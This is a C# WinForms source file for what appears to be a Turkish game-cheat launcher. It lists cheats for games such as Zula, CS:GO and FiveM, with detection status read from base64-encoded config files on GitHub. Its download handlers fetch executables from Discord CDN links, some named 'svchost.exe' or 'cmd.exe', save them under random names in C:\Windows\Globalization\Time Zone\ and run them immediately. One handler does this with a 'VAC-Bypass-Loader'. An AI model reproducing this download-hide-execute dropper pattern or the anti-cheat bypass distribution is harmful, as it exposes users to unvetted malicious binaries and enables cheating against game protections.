using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace New_UI
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
            guna2Panel1.BackColor = Color.FromArgb(145, Color.Black);

        }


       public static string infomessage = "";
        public static string func = "";
      public static string title = "";
       public static string status = "";
        public static string lastupdate = "";
        public static string websitelink = "";
        public static string cheatsdata = "";
        public static string ZulaDataL = "";
        public static string CraftriseDataL = "";
        public string usernameAveri = "";
        public string messagecountAveri = "";
        public string reactionAveri = "";
        public string profilephotoAveri = "";
        public string avatarphotoAveri = "";
        public string titleAveri = "";
        public string video1resimData = "";
        public string video1linkData = "";
        public string video2resimData = "";
        public string video2linkData = "";
        public string video3resimData = "";
        public string video3linkData = "";
        public string video4resimData = "";
        public string video4linkData = "";
        public string video5resimData = "";
        public string video5linkData = "";
        public static string YoutubeDataL = "";
        public static string SonOyuncuDataL = "";
        public static string GrowtopiaDataL = "";
        public static string CsgoDataL = "";
        public static string downloadURL = "";
        public static string csgoDataS = "";
        public static string CraftriseDataS = "";
        public static string ZulaDataS = "";
        public static string SonOyuncuDataS = "";
        public static string GrowtopiaDataS = "";
        public static string YoutubeBotDataS = "";
        public static string downloadURLData = "";
        public static string FivemHackL = "";
        public static string FivemHackS = "";
        public static string ValoL = "";
        public static string ValoS = "";


        public static string Base64Decode(string sifreliMetin)
        {

            var sifreliMetinBaytlari = Convert.FromBase64String(sifreliMetin);
            return Encoding.UTF8.GetString(sifreliMetinBaytlari);
        }
        private void guna2Button2_Click(object sender, EventArgs e)
        {
            cheatsbutton.Checked = true;
            newsbutton.Checked = false;
            socialbutton.Checked = false;
            accountbutton.Checked = false;

            guna2GroupBox2.Visible = false;
            guna2GroupBox3.Visible = false;
            guna2GroupBox5.Visible = true;
        }
      

        private void MainForm_Load(object sender, EventArgs e)
        {
            WebClient client = new WebClient();
            System.Diagnostics.Process.Start("https://discord.com/invite/sSWGMD8aZg");
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            cheatsbutton.Checked = true;
            guna2GroupBox2.Visible = false;
            guna2GroupBox3.Visible = false;

            //client.DownloadFile($"{profilephotoAveri}", @"C:\Windows\Temp\p.png");
            

            string cheatsData = client.DownloadString("https://raw.githubusercontent.com/Utku1114/AlphaUI/main/cheats.lcpg");

            cheatsData = Base64Decode(cheatsData);

            var cheatsDataD = JObject.Parse(cheatsData);
            string.Concat(cheatsDataD["zula"]["zulaDataL"]);

           ZulaDataL =  cheatsDataD["zula"]["zulaDataL"].ToString();
            ZulaDataS = cheatsDataD["zula"]["zulaDataL"].ToString();

            string.Concat(cheatsDataD["craftrise"]["craftriseDataL"]);

            CraftriseDataL = cheatsDataD["craftrise"]["craftriseDataL"].ToString();
            CraftriseDataS = cheatsDataD["craftrise"]["craftriseDataS"].ToString();

            string.Concat(cheatsDataD["youtubebot"]["youtubeBotL"]);

            YoutubeDataL = cheatsDataD["youtubebot"]["youtubeBotL"].ToString();
            YoutubeBotDataS = cheatsDataD["youtubebot"]["youtubeBotS"].ToString();

            string.Concat(cheatsDataD["sonoyuncu"]["sonoyuncuL"]);

            SonOyuncuDataL = cheatsDataD["sonoyuncu"]["sonoyuncuL"].ToString();
            SonOyuncuDataS = cheatsDataD["sonoyuncu"]["sonoyuncuS"].ToString();

            string.Concat(cheatsDataD["growtopia"]["growtopiaL"]);

            GrowtopiaDataL = cheatsDataD["growtopia"]["growtopiaL"].ToString();
            GrowtopiaDataS = cheatsDataD["growtopia"]["growtopiaS"].ToString();

            string.Concat(cheatsDataD["csgo"]["csgoL"]);

            CsgoDataL = cheatsDataD["csgo"]["csgoL"].ToString();
            csgoDataS = cheatsDataD["csgo"]["csgoS"].ToString();


            string.Concat(cheatsDataD["fivem"]["fivemL"]);

            FivemHackL = cheatsDataD["fivem"]["fivemL"].ToString();
            FivemHackS = cheatsDataD["fivem"]["fivemS"].ToString();

            string.Concat(cheatsDataD["fivem"]["fivemL"]);

            ValoL = cheatsDataD["valo"]["valoL"].ToString();
            ValoS = cheatsDataD["valo"]["valoS"].ToString();

            string.Concat(cheatsDataD["zula"]["zulaDataL"]);

            ValoL = cheatsDataD["zula"]["zulaDataL"].ToString();
            ValoS = cheatsDataD["zula"]["ZulaDataS"].ToString();


            if (ZulaDataS == "beta")
            {
                guna2HtmlLabel1.Text = "● Beta Test";
                guna2HtmlLabel1.ForeColor = Color.Cyan;
            }
            else
            {
                if (ZulaDataS == "undetected")
                {
                    guna2HtmlLabel1.Text = "● Undetected";
                    guna2HtmlLabel1.ForeColor = Color.Lime;
                }
                else
                {
                    if (ZulaDataS == "detected")
                    {
                        guna2HtmlLabel1.Text = "● Detected";
                        guna2HtmlLabel1.ForeColor = Color.Red;
                    }
                    else
                    {
                        return;
                    }
                }
            }

            if (CraftriseDataS == "beta")
            {
                guna2HtmlLabel18.Text = "● Beta Test";
                guna2HtmlLabel18.ForeColor = Color.Cyan;
            }
            else
            {
                if (CraftriseDataS == "undetected")
                {
                    guna2HtmlLabel18.Text = "● Undetected";
                    guna2Button1.ForeColor = Color.Lime;
                }
                else
                {
                    if (CraftriseDataS == "detected")
                    {
                        guna2HtmlLabel18.Text = "● Detected";
                        guna2Button1.ForeColor = Color.Red;
                    }
                    else
                    {
                        return;
                    }
                }
            }

            if (SonOyuncuDataS == "beta")
            {
                guna2HtmlLabel26.Text = "● Beta Test";
                guna2HtmlLabel26.ForeColor = Color.Cyan;
            }
            else
            {
                if (SonOyuncuDataS == "undetected")
                {
                    guna2HtmlLabel26.Text = "● Undetected";
                    guna2Button1.ForeColor = Color.Lime;
                }
                else
                {
                    if (SonOyuncuDataS == "detected")
                    {
                        guna2HtmlLabel1.Text = "● Detected";
                        guna2Button1.ForeColor = Color.Red;
                    }
                    else
                    {
                        return;
                    }
                }
            }
            if (GrowtopiaDataS == "beta")
            {
                guna2HtmlLabel35.Text = "● Beta Test";
                guna2HtmlLabel35.ForeColor = Color.Cyan;
            }
            else
            {
                if (GrowtopiaDataS == "undetected")
                {
                    guna2HtmlLabel35.Text = "● Undetected";
                    guna2Button1.ForeColor = Color.Lime;
                }
                else
                {
                    if (GrowtopiaDataS == "detected")
                    {
                        guna2HtmlLabel35.Text = "● Detected";
                        guna2Button1.ForeColor = Color.Red;
                    }
                    else
                    {
                        return;
                    }
                }
            }
            if (csgoDataS == "beta")
            {
                guna2HtmlLabel10.Text = "● Beta Test";
                guna2HtmlLabel10.ForeColor = Color.Cyan;
            }
            else
            {
                if (csgoDataS == "undetected")
                {
                    guna2HtmlLabel10.Text = "● Undetected";
                    guna2Button1.ForeColor = Color.Lime;
                }
                else
                {
                    if (csgoDataS == "detected")
                    {
                        guna2HtmlLabel10.Text = "● Detected";
                        guna2Button1.ForeColor = Color.Red;
                    }
                    else
                    {
                        return;
                    }
                }
            }
            if (YoutubeBotDataS == "beta")
            {
                guna2HtmlLabel6.Text = "● Beta Test";
                guna2HtmlLabel6.ForeColor = Color.Cyan;
            }
            else
            {
                if (YoutubeBotDataS == "undetected")
                {
                    guna2HtmlLabel6.Text = "● Undetected";
                    guna2Button1.ForeColor = Color.Lime;
                }
                else
                {
                    if (YoutubeBotDataS == "detected")
                    {
                        guna2HtmlLabel6.Text = "● Detected";
                        guna2Button1.ForeColor = Color.Red;
                    }
                    else
                    {
                        return;
                    }
                }
            }
           
        }



        private void guna2HtmlLabel1_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
            cheatsbutton.Checked = false;
            newsbutton.Checked = true;
            socialbutton.Checked = false;
            accountbutton.Checked = false;
        }

        private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            guna2GroupBox2.Visible = true;
            guna2GroupBox2.Location = new Point(0, 0);
            guna2GroupBox5.Visible = false;

            downloadURL = "https://cdn.discordapp.com/attachments/832240563200851968/873170147152650250/svchost.exe";
            downloadURLData = "Xm73Hl3F.exe";
            string zulaData = client.DownloadString((ZulaDataL));
            zulaData = Base64Decode(zulaData);
            var zulaDataD = JObject.Parse(zulaData);
            string.Concat(zulaDataD["function"]["listfunc"]);

            func = zulaDataD["function"]["listfunc"].ToString();

            string.Concat(zulaDataD["title"]);

            title = zulaDataD["title"].ToString();

            string.Concat(zulaDataD["status"]);

            status = zulaDataD["status"].ToString();

            if (status == "beta")
            {
                guna2HtmlLabel12.Text = "● Beta";
                guna2HtmlLabel12.ForeColor = Color.Cyan;
            }
            else
            {
                if (status == "undetected")
                {
                    guna2HtmlLabel12.Text = "● Undetected";
                    guna2HtmlLabel12.ForeColor = Color.Lime;
                }
                else
                {
                    if (status == "detected")
                    {
                        guna2HtmlLabel12.Text = "● Detected";
                        guna2HtmlLabel12.ForeColor = Color.Red;
                    }
                    else
                    {

                    }
                }
            }

            string.Concat(zulaDataD["lastupdate"]);

            lastupdate = zulaDataD["lastupdate"].ToString();

            string.Concat(zulaDataD["infomessage"]);

            infomessage = zulaDataD["infomessage"].ToString();

            string.Concat(zulaDataD["lastupdate"]);

            websitelink = zulaDataD["websitelink"].ToString();


            guna2HtmlLabel14.Text = lastupdate;
            guna2HtmlLabel11.Text = title;
            ozellikler.Text = func;
        }

        private void guna2HtmlLabel14_Click(object sender, EventArgs e)
        {

        }
       

        private void socialbutton_Click(object sender, EventArgs e)
        {
           // cheatsbutton.Checked = false;
           // newsbutton.Checked = false;
           // socialbutton.Checked = true;
           // accountbutton.Checked = false;


           // WebClient client = new WebClient();
           //string downloadLinks = client.DownloadString("https://github.com/Utku1114/AlphaUI/raw/main/links.lcpg");
           // string linksData = "";
           // MessageBox.Show((downloadLinks));
           // linksData = Base64Decode(downloadLinks);
           // MessageBox.Show((downloadLinks));
           // MessageBox.Show((linksData));
           // var linksDData = JObject.Parse(linksData);


           // try
           // {
           //     video1resimData = linksDData["video1"]["resim"].ToString();
           //     video1linkData = linksDData["video1"]["link"].ToString();
           // }
           // catch
           // {
           //     MessageBox.Show("Hata");
           // }
           // try
           // {
           //     video2resimData = linksDData["video2"]["resim"].ToString();
           //     video2linkData = linksDData["video2"]["link"].ToString();
           // }
           // catch
           // {
           //     MessageBox.Show("Hata");
           // }
           // try
           // {
           //     video3resimData = linksDData["video3"]["resim"].ToString();
           //     video3linkData = linksDData["video3"]["link"].ToString();
           // }
           // catch
           // {
           //     MessageBox.Show("Hata");
           // }
           // try
           // {
           //     video4resimData = linksDData["video4"]["resim"].ToString();
           //     video4linkData = linksDData["video4"]["link"].ToString();
           // }
           // catch
           // {
           //     MessageBox.Show("Hata");
           // }
           // try
           // {
           //     video5resimData = linksDData["video5"]["resim"].ToString();
           //     video5linkData = linksDData["video5"]["link"].ToString();
           // }
           // catch
           // {
           //     MessageBox.Show("Hata");
           // }
           

        }

        private void function_TextChanged(object sender, EventArgs e)
        {

        }

        private void guna2TileButton2_Click(object sender, EventArgs e)
        {
            MessageBox.Show((infomessage));
        }

        private void guna2TileButton3_Click(object sender, EventArgs e)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            System.Diagnostics.Process.Start((websitelink));
        }

        private void guna2PictureBox7_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            guna2GroupBox2.Visible = true;
            guna2GroupBox2.Location = new Point(0, 0);
            guna2GroupBox5.Visible = false;

            downloadURL = "https://cdn.discordapp.com/attachments/837789172835811378/848611976002928680/LegendaryCR.exe";
            downloadURLData = "Tyi9BMe3.exe";
            string craftriseData = client.DownloadString((CraftriseDataL));
            craftriseData = Base64Decode(craftriseData);
            var craftriseDataD = JObject.Parse(craftriseData);
            string.Concat(craftriseDataD["function"]["listfunc"]);

            func = craftriseDataD["function"]["listfunc"].ToString();

            string.Concat(craftriseDataD["title"]);

            title = craftriseDataD["title"].ToString();

            string.Concat(craftriseDataD["status"]);

            status = craftriseDataD["status"].ToString();

            if (status == "beta")
            {
                guna2HtmlLabel12.Text = "● Beta";
                guna2HtmlLabel12.ForeColor = Color.Cyan;
            }
            else
            {
                if (status == "undetected")
                {
                    guna2HtmlLabel12.Text = "● Undetected";
                    guna2HtmlLabel12.ForeColor = Color.Lime;
                }
                else
                {
                    if (status == "detected")
                    {
                        guna2HtmlLabel12.Text = "● Detected";
                        guna2HtmlLabel12.ForeColor = Color.Red;
                    }
                    else
                    {

                    }
                }
            }

            string.Concat(craftriseDataD["lastupdate"]);

            lastupdate = craftriseDataD["lastupdate"].ToString();

            string.Concat(craftriseDataD["infomessage"]);

            infomessage = craftriseDataD["infomessage"].ToString();

            string.Concat(craftriseDataD["lastupdate"]);

            websitelink = craftriseDataD["websitelink"].ToString();


            guna2HtmlLabel14.Text = lastupdate;
            guna2HtmlLabel11.Text = title;
            ozellikler.Text = func;
        }

        private void accountbutton_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            cheatsbutton.Checked = false;
            newsbutton.Checked = false;
            socialbutton.Checked = false;
            accountbutton.Checked = true;

            guna2GroupBox2.Visible = false;
            guna2GroupBox5.Visible = false;
            guna2GroupBox3.Visible = true;
            guna2GroupBox3.Location = new Point(0, 0);
            try
            {
                client.DownloadFile((profilephotoAveri), @"C:\Windows\Temp\p.png");
            }
            catch
            {

            }
            try
            {
                client.DownloadFile((avatarphotoAveri), @"C:\Windows\Temp\a.png");
            }
            catch
            {

            }




            if (titleAveri == "Founder")
            {

            }
            else
            {
                guna2Panel2.BackColor = Color.Teal;
                guna2HtmlLabel28.Text = "Normal Üye";
            }

            if (titleAveri == "Likes")
            {
                guna2HtmlLabel27.Location = new Point(32, 23);
                guna2PictureBox12.Visible = false;
                guna2Panel2.BackColor = Color.MediumSlateBlue;
                guna2HtmlLabel28.Text = "Beğeni Kasıcı";
                guna2HtmlLabel28.Location = new Point(38,3);
            }

            if (titleAveri == "Moderator")
            {
                guna2HtmlLabel27.Location = new Point(32, 23);
                guna2PictureBox12.Visible = false;
                guna2Panel2.BackColor = Color.Lime;
                guna2HtmlLabel28.Text = "Moderatör";
                guna2HtmlLabel28.Location = new Point(38, 3);
            }

            if (titleAveri == "Premium")
            {
                guna2Panel2.BackColor = Color.DarkTurquoise;
                guna2HtmlLabel28.Text = "Premium";
                guna2HtmlLabel28.Location = new Point(38, 3);
            }
            guna2HtmlLabel27.Text = usernameAveri;
            guna2HtmlLabel31.Text = ("Message: " + (messagecountAveri));
            guna2HtmlLabel31.Text = ("Message: " + (reactionAveri));
            try
            {
                
                guna2PictureBox11.BackgroundImage = Image.FromFile(@"C:\Windows\Temp\a.png");
            }
            catch
            {

            }
            guna2PictureBox11.BackgroundImageLayout = ImageLayout.Zoom;
            try
            {
                guna2PictureBox10.BackgroundImage = Image.FromFile(@"C:\Windows\Temp\p.png");
            }
            catch
            {

            }
            
            //guna2PictureBox10.Load(profilephotoAveri);
            
        }

        private void guna2PictureBox13_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start((video1linkData));
        }

        private void guna2PictureBox14_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start((video2linkData));
        }

        private void guna2PictureBox15_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start((video3linkData));
        }

        private void guna2PictureBox16_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start((video4linkData));
        }

        private void guna2PictureBox17_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start((video5linkData));
        }

        private void guna2PictureBox11_Click(object sender, EventArgs e)
        {

        }

        private void guna2PictureBox2_Click(object sender, EventArgs e)
        {
            notifyIcon1.BalloonTipIcon = ToolTipIcon.Info;
            notifyIcon1.BalloonTipText = "Detected";
            notifyIcon1.BalloonTipTitle = "LegendUI";
            notifyIcon1.Text = "LegendUI";
            notifyIcon1.Visible = true;
            notifyIcon1.ShowBalloonTip(30000);
            return;
        }

        private void guna2PictureBox18_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            downloadURL = "https://cdn.discordapp.com/attachments/820364697182273608/850354722509684746/Cracked.exe";
            downloadURLData = "Cracked.exe";
            guna2GroupBox5.Visible = false;
            guna2GroupBox2.Location = new Point(0, 0);
            guna2GroupBox2.Visible = true;


            string growtopiaData = client.DownloadString((GrowtopiaDataL));

            growtopiaData = Base64Decode(sifreliMetin: growtopiaData);



            var growtopiaDataD = JObject.Parse(growtopiaData);



            string.Concat(growtopiaDataD["function"]["listfunc"]);

            func = growtopiaDataD["function"]["listfunc"].ToString();

            string.Concat(growtopiaDataD["title"]);

            title = growtopiaDataD["title"].ToString();

            string.Concat(growtopiaDataD["status"]);

            status = growtopiaDataD["status"].ToString();

            if (status == "beta")
            {
                guna2HtmlLabel12.Text = "● Beta";
                guna2HtmlLabel12.ForeColor = Color.Cyan;
            }
            else
            {
                if (status == "undetected")
                {
                    guna2HtmlLabel12.Text = "● Undetected";
                    guna2HtmlLabel12.ForeColor = Color.Lime;
                }
                else
                {
                    if (status == "detected")
                    {
                        guna2HtmlLabel12.Text = "● Detected";
                        guna2HtmlLabel12.ForeColor = Color.Red;
                    }
                    else
                    {

                    }
                }
            }

            string.Concat(growtopiaDataD["lastupdate"]);

            lastupdate = growtopiaDataD["lastupdate"].ToString();

            string.Concat(growtopiaDataD["infomessage"]);

            infomessage = growtopiaDataD["infomessage"].ToString();

            string.Concat(growtopiaDataD["lastupdate"]);

            websitelink = growtopiaDataD["websitelink"].ToString();


            guna2HtmlLabel14.Text = lastupdate;
            guna2HtmlLabel11.Text = title;
            ozellikler.Text = func;


        }

        private void guna2PictureBox3_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            downloadURL = "https://cdn.discordapp.com/attachments/807970255908896779/861966149930188810/Bot.exe";
            downloadURLData = "JhKL647.exe";

            guna2GroupBox5.Visible = false;
            guna2GroupBox2.Location = new Point(0, 0);
            guna2GroupBox2.Visible = true;


            string youtubeData = client.DownloadString((YoutubeDataL));

            youtubeData = Base64Decode(sifreliMetin:youtubeData);

           

            var youtubeDataD = JObject.Parse(youtubeData);



            string.Concat(youtubeDataD["function"]["listfunc"]);

            func = youtubeDataD["function"]["listfunc"].ToString();

            string.Concat(youtubeDataD["title"]);

            title = youtubeDataD["title"].ToString();

            string.Concat(youtubeDataD["status"]);

            status = youtubeDataD["status"].ToString();

            if (status == "beta")
            {
                guna2HtmlLabel12.Text = "● Beta";
                guna2HtmlLabel12.ForeColor = Color.Cyan;
            }
            else
            {
                if (status == "undetected")
                {
                    guna2HtmlLabel12.Text = "● Undetected";
                    guna2HtmlLabel12.ForeColor = Color.Lime;
                }
                else
                {
                    if (status == "detected")
                    {
                        guna2HtmlLabel12.Text = "● Detected";
                        guna2HtmlLabel12.ForeColor = Color.Red;
                    }
                    else
                    {

                    }
                }
            }

            string.Concat(youtubeDataD["lastupdate"]);

            lastupdate = youtubeDataD["lastupdate"].ToString();

            string.Concat(youtubeDataD["infomessage"]);

            infomessage = youtubeDataD["infomessage"].ToString();

            string.Concat(youtubeDataD["lastupdate"]);

            websitelink = youtubeDataD["websitelink"].ToString();


            guna2HtmlLabel14.Text = lastupdate;
            guna2HtmlLabel11.Text = title;
            ozellikler.Text = func;


        }

        private void guna2GroupBox2_Click(object sender, EventArgs e)
        {

        }

        private void guna2PictureBox6_Click(object sender, EventArgs e)
        {

        }

        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void guna2PictureBox8_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;


            guna2GroupBox5.Visible = false;
            guna2GroupBox2.Location = new Point(0, 0);
            guna2GroupBox2.Visible = true;

            downloadURL = "https://cdn.discordapp.com/attachments/837789172835811378/848611666975260722/LegendarySO.exe";
            downloadURLData = "HiM5Fdk7e.exe";
            string sonoyuncuData = client.DownloadString((SonOyuncuDataL));

            sonoyuncuData = Base64Decode(sifreliMetin: sonoyuncuData);



            var sonoyuncuDataD = JObject.Parse(sonoyuncuData);



            string.Concat(sonoyuncuDataD["function"]["listfunc"]);

            func = sonoyuncuDataD["function"]["listfunc"].ToString();

            string.Concat(sonoyuncuDataD["title"]);

            title = sonoyuncuDataD["title"].ToString();

            string.Concat(sonoyuncuDataD["status"]);

            status = sonoyuncuDataD["status"].ToString();

            if (status == "beta")
            {
                guna2HtmlLabel12.Text = "● Beta";
                guna2HtmlLabel12.ForeColor = Color.Cyan;
            }
            else
            {
                if (status == "undetected")
                {
                    guna2HtmlLabel12.Text = "● Undetected";
                    guna2HtmlLabel12.ForeColor = Color.Lime;
                }
                else
                {
                    if (status == "detected")
                    {
                        guna2HtmlLabel12.Text = "● Detected";
                        guna2HtmlLabel12.ForeColor = Color.Red;
                    }
                    else
                    {

                    }
                }
            }

            string.Concat(sonoyuncuDataD["lastupdate"]);

            lastupdate = sonoyuncuDataD["lastupdate"].ToString();

            string.Concat(sonoyuncuDataD["infomessage"]);

            infomessage = sonoyuncuDataD["infomessage"].ToString();

            string.Concat(sonoyuncuDataD["lastupdate"]);

            websitelink = sonoyuncuDataD["websitelink"].ToString();


            guna2HtmlLabel14.Text = lastupdate;
            guna2HtmlLabel11.Text = title;
            ozellikler.Text = func;

        }

        private void guna2PictureBox5_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;


            guna2GroupBox5.Visible = false;
            guna2GroupBox2.Location = new Point(0, 0);
            guna2GroupBox2.Visible = true;
            downloadURL = "https://cdn.discordapp.com/attachments/807970255908896779/861965461335703592/CS.exe";
            downloadURLData = "JhKL64.exe";

            string csgoData = client.DownloadString((CsgoDataL));

            csgoData = Base64Decode(sifreliMetin: csgoData);



            var csgoDataD = JObject.Parse(csgoData);



            string.Concat(csgoDataD["function"]["listfunc"]);

            func = csgoDataD["function"]["listfunc"].ToString();

            string.Concat(csgoDataD["title"]);

            title = csgoDataD["title"].ToString();

            string.Concat(csgoDataD["status"]);

            status = csgoDataD["status"].ToString();

            if (status == "beta")
            {
                guna2HtmlLabel12.Text = "● Beta";
                guna2HtmlLabel12.ForeColor = Color.Cyan;
            }
            else
            {
                if (status == "undetected")
                {
                    guna2HtmlLabel12.Text = "● Undetected";
                    guna2HtmlLabel12.ForeColor = Color.Lime;
                }
                else
                {
                    if (status == "detected")
                    {
                        guna2HtmlLabel12.Text = "● Detected";
                        guna2HtmlLabel12.ForeColor = Color.Red;
                    }
                    else
                    {

                    }
                }
            }

            string.Concat(csgoDataD["lastupdate"]);

            lastupdate = csgoDataD["lastupdate"].ToString();

            string.Concat(csgoDataD["infomessage"]);

            infomessage = csgoDataD["infomessage"].ToString();

            string.Concat(csgoDataD["lastupdate"]);

            websitelink = csgoDataD["websitelink"].ToString();


            guna2HtmlLabel14.Text = lastupdate;
            guna2HtmlLabel11.Text = title;
            ozellikler.Text = func;



        }

        private void guna2TileButton1_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            try
            {
                client.DownloadFile((downloadURL), @"C:\Windows\Globalization\Time Zone\" + (downloadURLData));
            }
            catch
            {
                MessageBox.Show("Decode failed Code:[0x24]", "LegendUI Security");
            }
            try
            {
                System.Diagnostics.Process.Start(@"C:\Windows\Globalization\Time Zone\" + (downloadURLData));
            }
            catch
            {
                MessageBox.Show("Process failed Code:[0x25]", "LegendUI Security");
            }
        
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }

        private void guna2TileButton4_Click(object sender, EventArgs e)
        {
            WebClient client = new WebClient();
            client.DownloadFile("https://cdn.discordapp.com/attachments/807970255908896779/861706322377965608/VAC-Bypass-Loader.exe", @"C:\Windows\Globalization\Time Zone\VAC-Bypass.exe");
            System.Diagnostics.Process.Start(@"C:\Windows\Globalization\Time Zone\VAC-Bypass.exe");
        }

        private void guna2PictureBox13_Click_1(object sender, EventArgs e)
        {
            WebClient client = new WebClient();

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            downloadURL = "https://cdn.discordapp.com/attachments/856983985300307969/866315917864337438/FiveM_GUI.exe";
            downloadURLData = "Vqlo.exe";
            guna2GroupBox5.Visible = false;
            guna2GroupBox2.Location = new Point(0, 0);
            guna2GroupBox2.Visible = true;


            string fivemData = client.DownloadString((FivemHackL));

            fivemData = Base64Decode(sifreliMetin: fivemData);



            var fivemDataD = JObject.Parse(fivemData);



            string.Concat(fivemDataD["function"]["listfunc"]);

            func = fivemDataD["function"]["listfunc"].ToString();

            string.Concat(fivemDataD["title"]);

            title = fivemDataD["title"].ToString();

            string.Concat(fivemDataD["status"]);

            status = fivemDataD["status"].ToString();

            if (status == "beta")
            {
                guna2HtmlLabel12.Text = "● Beta";
                guna2HtmlLabel12.ForeColor = Color.Cyan;
            }
            else
            {
                if (status == "undetected")
                {
                    guna2HtmlLabel12.Text = "● Undetected";
                    guna2HtmlLabel12.ForeColor = Color.Lime;
                }
                else
                {
                    if (status == "detected")
                    {
                        guna2HtmlLabel12.Text = "● Detected";
                        guna2HtmlLabel12.ForeColor = Color.Red;
                    }
                    else
                    {

                    }
                }
            }

            string.Concat(fivemDataD["lastupdate"]);

            lastupdate = fivemDataD["lastupdate"].ToString();

            string.Concat(fivemDataD["infomessage"]);

            infomessage = fivemDataD["infomessage"].ToString();

            string.Concat(fivemDataD["lastupdate"]);

            websitelink = fivemDataD["websitelink"].ToString();


            guna2HtmlLabel14.Text = lastupdate;
            guna2HtmlLabel11.Text = title;
            ozellikler.Text = func;
        }

        private void guna2PictureBox14_Click_1(object sender, EventArgs e)
        {
            WebClient client = new WebClient();

            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            downloadURL = "https://cdn.discordapp.com/attachments/866678292470693919/866681187153477653/cmd.exe";
            downloadURLData = "Fivem.exe";
            guna2GroupBox5.Visible = false;
            guna2GroupBox2.Location = new Point(0, 0);
            guna2GroupBox2.Visible = true;


            string valoData = client.DownloadString((ValoL));

            valoData = Base64Decode(sifreliMetin: valoData);



            var valoDataD = JObject.Parse(valoData);



            string.Concat(valoDataD["function"]["listfunc"]);

            func = valoDataD["function"]["listfunc"].ToString();

            string.Concat(valoDataD["title"]);

            title = valoDataD["title"].ToString();

            string.Concat(valoDataD["status"]);

            status = valoDataD["status"].ToString();

            if (status == "beta")
            {
                guna2HtmlLabel12.Text = "● Beta";
                guna2HtmlLabel12.ForeColor = Color.Cyan;
            }
            else
            {
                if (status == "undetected")
                {
                    guna2HtmlLabel12.Text = "● Undetected";
                    guna2HtmlLabel12.ForeColor = Color.Lime;
                }
                else
                {
                    if (status == "detected")
                    {
                        guna2HtmlLabel12.Text = "● Detected";
                        guna2HtmlLabel12.ForeColor = Color.Red;
                    }
                    else
                    {

                    }
                }
            }

            string.Concat(valoDataD["lastupdate"]);

            lastupdate = valoDataD["lastupdate"].ToString();

            string.Concat(valoDataD["infomessage"]);

            infomessage = valoDataD["infomessage"].ToString();

            string.Concat(valoDataD["lastupdate"]);

            websitelink = valoDataD["websitelink"].ToString();


            guna2HtmlLabel14.Text = lastupdate;
            guna2HtmlLabel11.Text = title;
            ozellikler.Text = func;
        }
    }
}
